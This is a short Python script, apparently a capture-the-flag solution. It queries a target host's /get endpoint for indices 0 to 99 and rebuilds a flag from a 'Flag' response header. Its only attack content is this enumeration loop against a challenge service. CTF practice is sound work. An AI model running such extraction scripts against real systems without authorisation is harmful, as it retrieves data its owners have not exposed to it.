import requests
import sys

flag = ['_' for _ in range(100)]

for i in range(100):
    try:
        resp = requests.get(f"http://{sys.argv[1]}/get?idx={i}", allow_redirects=False)
        idx, letter = resp.headers.get("Flag").split("_")
        idx = int(idx)
        flag[idx] = letter
    except:
        pass
    

print(''.join(flag))